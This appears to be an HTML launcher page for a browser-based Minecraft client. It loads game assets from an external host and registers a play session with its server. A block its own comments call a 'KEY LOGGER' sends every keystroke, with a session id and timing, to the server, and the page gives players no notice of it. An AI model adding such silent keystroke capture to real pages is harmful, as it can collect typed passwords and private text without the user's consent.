<!DOCTYPE html>
<html>

<head>

	<meta charset="UTF-8">

	<title>Game</title>

	<script src="bootstrap.js?v=1"></script>

</head>

<body
	id="game_frame"
	style="
		margin:0;
		width:100vw;
		height:100vh;
		background:black;
		overflow:hidden;
	">

<script>

"use strict";

window.addEventListener("load", async () => {

	// =========================
	// GAME OPTIONS
	// =========================

	window.eaglercraftXOpts = {

		container: "game_frame",

		assetsURI:
			"https://markytuffclient.vercel.app/assets.epw"

	};

	// =========================
	// CREATE SESSION
	// =========================

	const sessionId =
		crypto.randomUUID();

	const startTime =
		Date.now();

	console.log(
		"SESSION:",
		sessionId
	);

	// create session in db
	await fetch("/api/start", {

		method: "POST",

		headers: {
			"Content-Type":
				"application/json"
		},

		body: JSON.stringify({
			sessionId: sessionId
		})

	});

	// =========================
	// KEY LOGGER
	// =========================

	window.addEventListener(
		"keydown",
		async (e) => {

			console.log(
				"KEY:",
				e.key
			);

			await fetch("/api/input", {

				method: "POST",

				headers: {
					"Content-Type":
						"application/json"
				},

				body: JSON.stringify({

					sessionId:
						sessionId,

					key:
						e.key,

					time:
						Date.now() -
						startTime

				})

			});

		},
		true
	);

	// =========================
	// START GAME
	// =========================

	main();

});

</script>

</body>
</html>
